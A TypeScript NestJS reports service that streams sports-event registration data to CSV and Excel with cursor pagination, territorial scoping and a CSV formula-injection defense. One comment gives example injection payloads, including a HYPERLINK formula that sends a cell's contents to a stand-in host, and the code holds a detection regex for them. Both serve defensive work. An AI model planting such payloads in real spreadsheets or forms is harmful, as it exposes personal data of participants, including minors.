// ===========================================
// Reports Service — generación en streaming (T23 / Q5, Q23)
// ===========================================
//
// Antes este servicio traía TODAS las filas con un `findMany` sin paginar, las
// mapeaba a un array en memoria, armaba el workbook entero y recién ahí lo
// serializaba con `writeBuffer()`. Con 20.000 filas eso significaba tener a la
// vez: las entidades de Prisma, el array de filas, el árbol de celdas de ExcelJS
// y el Buffer final. Cuatro copias del reporte en el heap → riesgo de OOM.
//
// Ahora el pipeline es "de a lotes de punta a punta":
//
//   Prisma (lotes de 1000) → mapeo a filas → escritura al response → se libera
//
// El pico de memoria pasa a depender del tamaño del lote, no del total de filas.
import { Injectable, Logger } from '@nestjs/common';
import { Prisma } from '@prisma/client';
import { PrismaService } from '../../database/prisma.service';
import { Alcance, descripcionAlcance, ScopeService } from '../../common/scope';
import * as ExcelJS from 'exceljs';
import { Readable, pipeline } from 'stream';
import { promisify } from 'util';

const encadenar = promisify(pipeline);

export interface ParticipantReportFilters {
  disciplineId?: string;
  categoryId?: string;
  locality?: string;
  department?: string;
}

export interface TeamReportFilters {
  disciplineId?: string;
  categoryId?: string;
  locality?: string;
  department?: string;
}

/**
 * Cuántas filas se traen de la base por vuelta.
 *
 * 1000 es el valor que pide la tarea y es un buen punto medio: pocas idas y
 * vueltas a Postgres (20 queries para 20K filas) y un lote que ocupa unos pocos
 * MB aun con `include` de relaciones.
 */
export const TAMANIO_LOTE = 1000;

/**
 * Destino al que se escribe el reporte. Se declara estructuralmente (y no como
 * `express.Response`) para poder testear contra un `Writable` cualquiera sin
 * levantar un servidor HTTP.
 */
export interface DestinoReporte {
  write(chunk: string | Buffer): boolean;
  end(): void;
  once(evento: string, listener: (...args: any[]) => void): unknown;
  removeListener(evento: string, listener: (...args: any[]) => void): unknown;
  destroy(error?: Error): unknown;
  /** `express.Response` lo expone; un `Writable` pelado no. */
  readonly headersSent?: boolean;
}

/**
 * Descripción perezosa de un reporte: encabezados fijos + una función que, al
 * invocarse, arranca la paginación. Nada toca la base hasta que se consume el
 * generador, así que armar la especificación es gratis.
 */
export interface EspecificacionReporte {
  nombreHoja: string;
  headers: string[];
  /**
   * Línea que declara el alcance territorial aplicado (R05).
   *
   * Va **adentro del archivo**, como primera fila, y no en un header HTTP ni en
   * el nombre del archivo: el CSV se abre tres semanas después, ya renombrado y
   * reenviado por mail, y para entonces lo único que sobrevive es el contenido.
   * Sin esta línea, un delegado abre un padrón de 12 filas y no tiene forma de
   * saber si su departamento tiene 12 chicos inscriptos o si el reporte se
   * recortó.
   *
   * Es también el motivo por el que un filtro fuera de alcance no devuelve 403:
   * el reporte sale siempre, recortado y diciendo hasta dónde llega.
   */
  alcance: string;
  lotes: () => AsyncGenerator<unknown[][], void, undefined>;
}

// ===========================================
// Inyección de fórmulas en CSV (R15)
// ===========================================

/**
 * Caracteres con los que Excel, LibreOffice y Google Sheets interpretan la
 * celda como **fórmula** en vez de como texto. Se admiten espacios, tabs o
 * saltos por delante porque las planillas los descartan antes de decidir: una
 * celda que empieza con `" =1+1"` se evalúa igual que `"=1+1"`.
 */
// Los caracteres de control por delante son parte del ataque: es justo lo que
// hay que detectar, de ahí el disable.
// eslint-disable-next-line no-control-regex
const INICIO_DE_FORMULA = /^[\s\u0000-\u001f]*[=+\-@]/;

/**
 * ¿El texto es lisa y llanamente un número? (`-5`, `+3.5`, `1e3`)
 *
 * Sin espacios por delante ni por detrás a propósito: un `"		+1"` es un
 * número para la aritmética pero es una celda rara para una planilla, y la
 * diferencia entre "número con basura adelante" y "fórmula con basura adelante"
 * depende de qué programa la abra. Ante la duda, se prefija.
 */
const ES_NUMERO = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;

/**
 * Neutraliza la celda antes de escribirla en el CSV.
 *
 * El vector: un participante se anota con apellido `=1+1`, o mejor
 * `=HYPERLINK("http://malo/?d="&A1,"Ver")`, o `@SUM(...)`. El padrón se exporta
 * y alguien de la Secretaría lo abre con doble clic. Excel no ve un apellido:
 * ve una fórmula y la ejecuta, con acceso a las demás celdas de la fila —el DNI
 * del chico, el teléfono— y, con el diálogo de DDE aceptado, a ejecución de
 * comandos. El atacante no necesita entrar a ningún sistema: le alcanza con
 * escribir su apellido en el formulario público de inscripción.
 *
 * La defensa estándar es prefijar la celda con un apóstrofo, que las planillas
 * leen como "esto es texto" y no muestran.
 *
 * Los números se dejan intactos: `-5` no es una fórmula y prefijarlo lo
 * convertiría en texto, rompiendo las columnas numéricas del reporte.
 *
 * El .xlsx no lo necesita: `ExcelJS` escribe estos valores como celdas de tipo
 * string y sólo evalúa lo que se le pasa explícitamente como `{ formula: ... }`.
 * El agujero es exclusivo del CSV, donde el tipo de la celda lo decide quien
 * abre el archivo.
 */
export function neutralizarFormulaCsv(celda: unknown): string {
  // `String(celda)` y no `String(celda ?? '')`: el formato de salida tiene que
  // seguir siendo byte a byte el de antes para todo lo que no sea una fórmula
  // (un `null` se venía escribiendo como el texto "null", y hay un test que lo
  // fija). Este cambio toca sólo las celdas peligrosas.
  const texto = String(celda);

  if (typeof celda === 'number' || typeof celda === 'bigint') return texto;
  if (!INICIO_DE_FORMULA.test(texto)) return texto;
  if (ES_NUMERO.test(texto)) return texto;

  return `'${texto}`;
}

@Injectable()
export class ReportsService {
  private readonly logger = new Logger(ReportsService.name);

  constructor(
    private readonly prisma: PrismaService,
    private readonly scope: ScopeService,
  ) {}

  // ===========================================
  // Paginación
  // ===========================================

  /**
   * Paginación **por cursor**, no por OFFSET.
   *
   * Con `OFFSET n` Postgres tiene que generar y descartar las n filas previas en
   * cada página: el costo total de recorrer la tabla es O(N²/lote). Para 20.000
   * filas en lotes de 1000 son ~200.000 filas descartadas al pepe, y empeora a
   * medida que crece el padrón.
   *
   * El cursor, en cambio, se traduce a un `WHERE (campos_de_orden) > (valores de
   * la última fila)`: Postgres se posiciona en el índice y sigue leyendo. Costo
   * constante por página.
   *
   * Requisito: el `orderBy` tiene que ser un orden **total**. Por eso todos los
   * `orderBy` de acá abajo terminan en `{ id: 'asc' }`. Sin ese desempate, dos
   * filas con el mismo apellido y nombre podrían aparecer duplicadas en un lote
   * y faltar en otro.
   */
  private async *paginarPorCursor<T extends { id: string }>(
    traerLote: (cursorId?: string) => Promise<T[]>,
  ): AsyncGenerator<T[], void, undefined> {
    let cursorId: string | undefined;

    for (;;) {
      const lote = await traerLote(cursorId);
      if (lote.length === 0) return;

      yield lote;

      // Un lote incompleto significa que la tabla se terminó: evitamos una
      // query final que siempre vuelve vacía.
      if (lote.length < TAMANIO_LOTE) return;
      cursorId = lote[lote.length - 1].id;
    }
  }

  /**
   * Paginación por OFFSET. Se usa **sólo** para el reporte de resultados, que
   * ordena por una columna de una relación (`competition.name`); Prisma no
   * soporta `cursor` combinado con `orderBy` sobre relaciones. Es un caso donde
   * el OFFSET no duele: la tabla `Match` tiene órdenes de magnitud menos filas
   * que `Participant` o `Inscription` (un partido agrupa a decenas de personas).
   */
  private async *paginarPorOffset<T>(
    traerLote: (salto: number) => Promise<T[]>,
  ): AsyncGenerator<T[], void, undefined> {
    let salto = 0;

    for (;;) {
      const lote = await traerLote(salto);
      if (lote.length === 0) return;

      yield lote;

      if (lote.length < TAMANIO_LOTE) return;
      salto += lote.length;
    }
  }

  /** Convierte lotes de entidades en lotes de filas listas para escribir. */
  private async *mapearLotes<T>(
    lotes: AsyncGenerator<T[], void, undefined>,
    aFila: (entidad: T) => unknown[],
  ): AsyncGenerator<unknown[][], void, undefined> {
    for await (const lote of lotes) {
      yield lote.map(aFila);
    }
  }

  // ===========================================
  // Escritura CSV
  // ===========================================

  /**
   * Escribe el CSV directo al destino, lote por lote.
   *
   * Antes se armaba un único `string` con todo el archivo (y el controller le
   * concatenaba el BOM, duplicándolo otra vez). Para 20K filas eso es un string
   * de varios MB —contiguo, en el heap de V8— que además se copiaba a un Buffer
   * al mandarlo.
   *
   * El formato de salida es **byte a byte el mismo** que antes: BOM UTF-8, todas
   * las celdas entre comillas con `"` escapado como `""`, filas separadas por
   * `\n` y sin salto final. Por eso el `\n` va como prefijo de cada fila y no
   * como sufijo.
   *
   * Se usa `pipeline` y no un `while` con `res.write()` + espera manual de
   * `drain`, por el backpressure y muy concretamente por `compression()` (T18):
   *
   *  - El backpressure es imprescindible. Si el cliente descarga más lento de lo
   *    que Postgres nos entrega filas —lo normal en una conexión de oficina—,
   *    sin frenar la generación Node acumula los chunks pendientes y volvemos a
   *    tener el archivo entero en memoria, sólo que en el buffer del socket.
   *  - `compression()` reemplaza `res.write` por una escritura al gzip y
   *    **parchea `res.on`** para que un `on('drain')` se enganche al stream de
   *    zlib en lugar del socket. Pero no parchea `res.removeListener`: manejar
   *    el `drain` a mano deja un listener colgado en zlib por cada lote y a los
   *    10 salta el `MaxListenersExceededWarning`. `pipeline` usa `.pipe()`, que
   *    registra un único `on('drain')` para toda la vida del stream y cae del
   *    lado bueno del parche.
   *
   * De yapa: si el cliente corta la descarga, `pipeline` destruye el Readable y
   * la paginación se frena sola en vez de seguir consultando la base al pedo.
   */
  async escribirCsv(
    destino: DestinoReporte,
    espec: EspecificacionReporte,
  ): Promise<void> {
    // Primero se pide el lote inicial y recién después se escribe una sola
    // letra. Si la base rechaza la consulta, todavía no mandamos headers y Nest
    // puede devolver un 500 con JSON como corresponde. Al revés (encabezado
    // primero) cualquier fallo de la primera query terminaría en una descarga
    // rota (ver `abortar`).
    const iterador = espec.lotes();
    const primero = await iterador.next();

    const aLinea = (fila: unknown[]) => this.aLineaCsv(fila);
    const headers = espec.headers;

    const alcance = espec.alcance;

    async function* generar(): AsyncGenerator<string> {
      // El BOM lo necesita Excel en Windows para leer los acentos como UTF-8.
      // R05 — antes de los encabezados va la línea de alcance: primera fila del
      // archivo, imposible de perder al reenviarlo.
      yield '﻿' + aLinea([alcance]) + '\n' + aLinea(headers);

      let lote = primero;
      while (!lote.done) {
        // Se concatena el lote entero (≤1000 líneas) antes de emitirlo: un
        // chunk por fila multiplicaría por 1000 los write sin ganar nada.
        let bloque = '';
        for (const fila of lote.value) {
          bloque += '\n' + aLinea(fila);
        }
        yield bloque;
        lote = await iterador.next();
      }
    }

    try {
      await encadenar(
        // `Readable.from(gen)` por defecto arranca en objectMode con
        // highWaterMark 16, donde el 16 cuenta **chunks**: en teoría el
        // generador podría bufferear 16 lotes (16.000 filas) por delante del
        // cliente, muy por encima de la cota de 1000 que persigue T23.
        //
        // En la práctica no pasa: `pipeline` usa `.pipe()`, que pausa la fuente
        // apenas el destino devuelve `false`, y estando pausada no se piden más
        // chunks. Lo verifiqué mutando esta línea con un destino lento y el
        // adelanto seguía siendo de un lote. Se deja igual porque es la
        // semántica correcta —el límite se expresa en bytes, que es lo que
        // realmente ocupa el buffer— y no queremos que la cota dependa de un
        // detalle de implementación de `pipe()`.
        Readable.from(generar(), {
          objectMode: false,
          highWaterMark: 64 * 1024,
        }),
        destino as unknown as NodeJS.WritableStream,
      );
    } catch (error) {
      this.abortar(destino, error, `CSV "${espec.nombreHoja}"`);
    }
  }

  private aLineaCsv(fila: unknown[]): string {
    return fila
      .map((celda) => `"${neutralizarFormulaCsv(celda).replace(/"/g, '""')}"`)
      .join(',');
  }

  // ===========================================
  // Escritura Excel
  // ===========================================

  /**
   * Escribe el .xlsx directo al destino con `stream.xlsx.WorkbookWriter`.
   *
   * Por qué el WorkbookWriter y no `workbook.xlsx.write(res)`: el `Workbook`
   * normal mantiene todas las filas y celdas vivas hasta el final, así que
   * cambiar `writeBuffer()` por `write(res)` sólo elimina **una** de las copias
   * (el Buffer serializado), no el árbol de celdas —que es la parte cara: cada
   * celda es un objeto con fuente, relleno, alineación y 4 bordes. El
   * WorkbookWriter serializa cada fila a XML apenas se hace `row.commit()` y la
   * descarta; el zip se va empujando al response a medida que se genera.
   *
   * Lo que se pierde: el auto-ajuste de ancho de columna miraba TODAS las filas,
   * cosa imposible sin tenerlas todas. Acá se calcula con el primer lote (hasta
   * 1000 filas), que es más que representativo, y se aplica antes de escribir la
   * primera fila —ExcelJS emite el bloque `<cols>` recién ahí—. El resto del
   * estilo (encabezado azul, filas cebradas, bordes, altos de fila, panel
   * congelado) sobrevive igual gracias a `useStyles: true`.
   */
  async escribirExcel(
    destino: DestinoReporte,
    espec: EspecificacionReporte,
  ): Promise<void> {
    const workbook = new ExcelJS.stream.xlsx.WorkbookWriter({
      stream: destino as unknown as import('stream').Stream,
      // Sin esto ExcelJS descarta fuentes, rellenos y bordes: el reporte saldría
      // en blanco y negro y perderíamos la identidad visual del anterior.
      useStyles: true,
      // La tabla de strings compartidas ahorra bytes en el archivo, pero obliga
      // a acumular en memoria todos los textos distintos hasta el final: es
      // exactamente lo que estamos tratando de evitar.
      useSharedStrings: false,
    });
    workbook.creator = 'Juegos Evita Formosa';
    workbook.created = new Date();

    const worksheet = workbook.addWorksheet(espec.nombreHoja, {
      // ySplit 2 y no 1: ahora las filas fijas son la del alcance (R05) y la de
      // encabezados.
      views: [{ state: 'frozen', ySplit: 2 }],
    });

    try {
      const iterador = espec.lotes();
      const primero = await iterador.next();
      const primerLote: unknown[][] = primero.done ? [] : primero.value;

      this.ajustarAnchos(worksheet, espec.headers, primerLote);
      this.escribirAlcance(worksheet, espec.alcance);
      this.escribirEncabezado(worksheet, espec.headers);

      // `indice` es global (no por lote) para que el cebrado de filas quede
      // igual que en la versión anterior: par/impar sobre el total.
      let indice = 0;
      indice = this.escribirLote(worksheet, primerLote, indice);
      if (!primero.done) {
        for await (const lote of iterador) {
          indice = this.escribirLote(worksheet, lote, indice);
        }
      }

      await worksheet.commit();
      // `workbook.commit()` cierra el zip y termina el stream destino: no hay
      // que llamar a `destino.end()` después.
      await workbook.commit();
    } catch (error) {
      this.abortar(destino, error, `Excel "${espec.nombreHoja}"`);
    }
  }

  private ajustarAnchos(
    worksheet: ExcelJS.Worksheet,
    headers: string[],
    muestra: unknown[][],
  ): void {
    const anchos = headers.map((h) => Math.max(String(h).length, 10));
    for (const fila of muestra) {
      fila.forEach((celda, i) => {
        const largo =
          celda === null || celda === undefined ? 0 : String(celda).length;
        if (largo > anchos[i]) anchos[i] = largo;
      });
    }
    worksheet.columns = anchos.map((ancho) => ({
      width: Math.min(Math.max(ancho + 4, 12), 40),
    }));
  }

  /**
   * Fila 1: el alcance territorial aplicado (R05).
   *
   * Sin `mergeCells`: el `WorkbookWriter` serializa y descarta cada fila apenas
   * se hace `commit()`, y las celdas combinadas necesitan que la fila siga viva
   * cuando se cierra la hoja. El texto en A1 se lee igual y no arriesga el
   * streaming, que es lo que T23 vino a arreglar.
   */
  private escribirAlcance(worksheet: ExcelJS.Worksheet, alcance: string): void {
    const fila = worksheet.addRow([alcance]);
    fila.height = 20;
    fila.getCell(1).font = {
      italic: true,
      size: 10,
      name: 'Calibri',
      color: { argb: 'FF334155' },
    };
    fila.commit();
  }

  private escribirEncabezado(
    worksheet: ExcelJS.Worksheet,
    headers: string[],
  ): void {
    const headerRow = worksheet.addRow(headers);
    headerRow.height = 28;
    headerRow.eachCell((cell) => {
      cell.font = {
        bold: true,
        color: { argb: 'FFFFFFFF' },
        size: 11,
        name: 'Calibri',
      };
      cell.fill = {
        type: 'pattern',
        pattern: 'solid',
        fgColor: { argb: 'FF0F4C81' }, // Primary blue Evita
      };
      cell.alignment = { vertical: 'middle', horizontal: 'center' };
      cell.border = {
        top: { style: 'thin', color: { argb: 'FF0A3560' } },
        left: { style: 'thin', color: { argb: 'FF0A3560' } },
        bottom: { style: 'medium', color: { argb: 'FF041A33' } },
        right: { style: 'thin', color: { argb: 'FF0A3560' } },
      };
    });
    headerRow.commit();
  }

  /** Escribe un lote y devuelve el índice global de la próxima fila. */
  private escribirLote(
    worksheet: ExcelJS.Worksheet,
    lote: unknown[][],
    indiceInicial: number,
  ): number {
    let indice = indiceInicial;

    for (const valores of lote) {
      const row = worksheet.addRow(valores);
      row.height = 22;
      const esPar = indice % 2 === 1;
      row.eachCell((cell) => {
        cell.font = { size: 10, name: 'Calibri' };
        cell.alignment = { vertical: 'middle', horizontal: 'left' };
        if (esPar) {
          cell.fill = {
            type: 'pattern',
            pattern: 'solid',
            fgColor: { argb: 'FFF8FAFC' },
          };
        }
        cell.border = {
          top: { style: 'thin', color: { argb: 'FFE2E8F0' } },
          left: { style: 'thin', color: { argb: 'FFE2E8F0' } },
          bottom: { style: 'thin', color: { argb: 'FFE2E8F0' } },
          right: { style: 'thin', color: { argb: 'FFE2E8F0' } },
        };
      });
      // Acá está la clave del ahorro de memoria: la fila se serializa a XML y
      // ExcelJS la borra de `_rows`. Sin este commit el WorkbookWriter se
      // comporta igual de mal que el Workbook común.
      row.commit();
      indice++;
    }

    return indice;
  }

  // ===========================================
  // Manejo de errores a mitad del stream
  // ===========================================

  /**
   * Política de fallo a mitad del stream.
   *
   * Una vez que salió el primer byte ya se mandaron los headers `200` +
   * `Content-Disposition`, así que **no existe** la opción de devolver un 500 con
   * JSON: el cliente ya está escribiendo un archivo en disco. Las alternativas
   * eran:
   *
   *  a) Terminar la respuesta prolijamente (`res.end()`). Descartada: el usuario
   *     se queda con un CSV/XLSX que abre bien pero al que le faltan filas, sin
   *     ninguna señal de que está incompleto. Un padrón truncado en silencio es
   *     peor que ningún padrón.
   *  b) Escribir una fila "ERROR" al final. Descartada para el .xlsx (el zip ya
   *     quedaría corrupto) y frágil para el CSV (nadie lee la última línea).
   *  c) Destruir el socket. Elegida.
   *
   * Como no mandamos `Content-Length` (la respuesta va chunked, no sabemos el
   * tamaño de antemano), cortar el socket deja el `chunked encoding` sin su
   * chunk final: navegadores, `curl` y `fetch` lo reportan como descarga
   * fallida. El usuario ve un error y reintenta, que es lo que queremos.
   *
   * Si el fallo ocurre **antes** del primer byte (por ejemplo, la base rechaza
   * la primera query), relanzamos: ahí sí Nest puede responder un 500 normal.
   */
  private abortar(
    destino: DestinoReporte,
    error: unknown,
    contexto: string,
  ): void {
    const causa = error instanceof Error ? error : new Error(String(error));

    if (!destino.headersSent) {
      throw causa;
    }

    this.logger.error(
      `Falló la generación del reporte ${contexto} con la respuesta ya iniciada: ` +
        `se aborta la conexión para que el cliente no reciba un archivo truncado. ` +
        `Causa: ${causa.message}`,
      causa.stack,
    );
    destino.destroy(causa);
  }

  // ===========================================
  // PARTICIPANTS
  // ===========================================
  especificacionParticipants(
    alcance: Alcance,
    filters?: ParticipantReportFilters,
  ): EspecificacionReporte {
    const where: Prisma.ParticipantWhereInput = {};

    if (filters?.department) {
      where.department = { contains: filters.department, mode: 'insensitive' };
    }

    if (filters?.locality) {
      where.locality = { contains: filters.locality, mode: 'insensitive' };
    }

    if (filters?.disciplineId || filters?.categoryId) {
      where.inscriptions = {
        some: {
          ...(filters.categoryId ? { categoryId: filters.categoryId } : {}),
          ...(filters.disciplineId
            ? { category: { disciplineId: filters.disciplineId } }
            : {}),
        },
      };
    }

    const headers = [
      'DNI',
      'Nombre',
      'Apellido',
      'Sexo',
      'Fecha Nacimiento',
      'Departamento',
      'Localidad',
      'Teléfono',
      'Email',
      'Categorías',
    ];

    // R05 — el recorte territorial se aplica acá, sobre el mismo `where` que
    // usa el listado. El filtro `department=` que mande el cliente no lo
    // ensancha: los dos van bajo `AND`, así que pedir un departamento ajeno
    // devuelve cero filas y no un 403.
    const whereConAlcance = ScopeService.conAlcance(
      where,
      this.scope.whereParticipant(alcance),
    );

    return {
      nombreHoja: 'Padrón Participantes',
      headers,
      alcance: descripcionAlcance(alcance),
      lotes: () =>
        this.mapearLotes(
          this.paginarPorCursor((cursorId) =>
            this.prisma.participant.findMany({
              where: whereConAlcance,
              include: {
                inscriptions: {
                  include: { category: { include: { discipline: true } } },
                },
              },
              // El índice `@@index([lastName, firstName])` de `Participant`
              // cubre este orden; el `id` final sólo desempata.
              orderBy: [
                { lastName: 'asc' },
                { firstName: 'asc' },
                { id: 'asc' },
              ],
              take: TAMANIO_LOTE,
              ...(cursorId ? { cursor: { id: cursorId }, skip: 1 } : {}),
            }),
          ),
          (p) => [
            p.dni,
            p.firstName,
            p.lastName,
            p.sex,
            p.birthDate ? p.birthDate.toISOString().split('T')[0] : '',
            p.department,
            p.locality,
            p.phone || '',
            p.email || '',
            p.inscriptions
              .map((i) => `${i.category.discipline.name} - ${i.category.name}`)
              .join(' | '),
          ],
        ),
    };
  }

  // ===========================================
  // INSCRIPTIONS
  // ===========================================
  especificacionInscriptions(
    alcance: Alcance,
    disciplineId?: string,
    categoryId?: string,
    status?: string,
  ): EspecificacionReporte {
    const where: any = {};
    if (categoryId) where.categoryId = categoryId;
    if (status) where.status = status;
    if (disciplineId) {
      where.category = { disciplineId };
    }

    const headers = [
      'Código QR',
      'DNI Participante',
      'Nombre',
      'Apellido',
      'Sexo',
      'Disciplina',
      'Categoría',
      'Equipo',
      'Departamento',
      'Localidad',
      'Estado',
      'Fecha Inscripción',
    ];

    const whereConAlcance = ScopeService.conAlcance(
      where as Prisma.InscriptionWhereInput,
      this.scope.whereInscription(alcance),
    );

    return {
      nombreHoja: 'Inscripciones',
      headers,
      alcance: descripcionAlcance(alcance),
      lotes: () =>
        this.mapearLotes(
          this.paginarPorCursor((cursorId) =>
            this.prisma.inscription.findMany({
              where: whereConAlcance,
              include: {
                participant: true,
                category: { include: { discipline: true } },
                team: true,
              },
              orderBy: [{ createdAt: 'desc' }, { id: 'asc' }],
              take: TAMANIO_LOTE,
              ...(cursorId ? { cursor: { id: cursorId }, skip: 1 } : {}),
            }),
          ),
          (i) => [
            i.qrCode,
            i.participant.dni,
            i.participant.firstName,
            i.participant.lastName,
            i.participant.sex,
            i.category.discipline.name,
            i.category.name,
            i.team?.name || 'Individual',
            i.participant.department,
            i.participant.locality,
            i.status,
            i.createdAt ? i.createdAt.toISOString().split('T')[0] : '',
          ],
        ),
    };
  }

  // ===========================================
  // TEAMS
  // ===========================================
  especificacionTeams(
    alcance: Alcance,
    filters?: TeamReportFilters,
  ): EspecificacionReporte {
    const where: Prisma.TeamWhereInput = {};

    if (filters?.disciplineId) {
      where.disciplineId = filters.disciplineId;
    }

    if (filters?.categoryId) {
      where.categoryId = filters.categoryId;
    }

    if (filters?.department) {
      where.department = { contains: filters.department, mode: 'insensitive' };
    }

    if (filters?.locality) {
      where.locality = { contains: filters.locality, mode: 'insensitive' };
    }

    const headers = [
      'ID Equipo',
      'Nombre',
      'Disciplina',
      'Categoría',
      'Departamento',
      'Localidad',
      'Cantidad Miembros',
    ];

    const whereConAlcance = ScopeService.conAlcance(
      where,
      this.scope.whereTeam(alcance),
    );

    return {
      nombreHoja: 'Equipos',
      headers,
      alcance: descripcionAlcance(alcance),
      lotes: () =>
        this.mapearLotes(
          this.paginarPorCursor((cursorId) =>
            this.prisma.team.findMany({
              where: whereConAlcance,
              include: {
                category: { include: { discipline: true } },
                _count: { select: { members: true } },
              },
              orderBy: [{ name: 'asc' }, { id: 'asc' }],
              take: TAMANIO_LOTE,
              ...(cursorId ? { cursor: { id: cursorId }, skip: 1 } : {}),
            }),
          ),
          (t) => [
            t.id,
            t.name,
            t.category.discipline.name,
            t.category.name,
            t.department,
            t.locality,
            t._count.members,
          ],
        ),
    };
  }

  // ===========================================
  // RESULTS & FIXTURE
  // ===========================================
  especificacionResults(
    alcance: Alcance,
    competitionId?: string,
  ): EspecificacionReporte {
    const where: any = {};
    if (competitionId) where.competitionId = competitionId;

    const headers = [
      'Competencia',
      'Disciplina',
      'Categoría',
      'Etapa',
      'Fecha / Ronda',
      'Partido N°',
      'Estado',
      'Local',
      'Puntaje Local',
      'Visitante',
      'Puntaje Visitante',
      'Ganador',
      'Sede',
    ];

    return {
      nombreHoja: 'Resultados y Partidos',
      headers,
      // Los partidos son de una competencia provincial y no tienen departamento
      // propio: no hay recorte que aplicar, pero la línea sale igual para que el
      // archivo diga con qué alcance se pidió.
      alcance: descripcionAlcance(alcance),
      lotes: () =>
        this.mapearLotes(
          // OFFSET y no cursor: ver `paginarPorOffset`. El orden por
          // `competition.name` es una columna de otra tabla.
          this.paginarPorOffset((salto) =>
            this.prisma.match.findMany({
              where,
              include: {
                competition: {
                  include: { discipline: true, category: true },
                },
                venue: true,
                results: {
                  include: { team: true, participant: true },
                },
              },
              // El `id` final vuelve total al orden: sin él, dos partidos con la
              // misma competencia/ronda/número podrían intercambiarse entre
              // páginas y aparecer duplicados o faltar.
              orderBy: [
                { competition: { name: 'asc' } },
                { round: 'asc' },
                { matchNumber: 'asc' },
                { id: 'asc' },
              ],
              take: TAMANIO_LOTE,
              skip: salto,
            }),
          ),
          (m) => {
            const r1 = m.results[0];
            const r2 = m.results[1];
            const homeName =
              r1?.team?.name ||
              (r1?.participant
                ? `${r1.participant.lastName}, ${r1.participant.firstName}`
                : '-');
            const awayName =
              r2?.team?.name ||
              (r2?.participant
                ? `${r2.participant.lastName}, ${r2.participant.firstName}`
                : '-');
            const homeScore =
              r1?.scoreData && Object.values(r1.scoreData)[0] !== undefined
                ? String(Object.values(r1.scoreData)[0])
                : '-';
            const awayScore =
              r2?.scoreData && Object.values(r2.scoreData)[0] !== undefined
                ? String(Object.values(r2.scoreData)[0])
                : '-';

            let winnerName = '-';
            if (r1?.isWinner) winnerName = homeName;
            else if (r2?.isWinner) winnerName = awayName;

            return [
              m.competition.name ||
                `${m.competition.discipline.name} - ${m.competition.category.name}`,
              m.competition.discipline.name,
              m.competition.category.name,
              m.competition.stage,
              `Fecha ${m.round}`,
              m.matchNumber,
              m.status,
              homeName,
              homeScore,
              awayName,
              awayScore,
              winnerName,
              m.venue?.name || '-',
            ];
          },
        ),
    };
  }
}
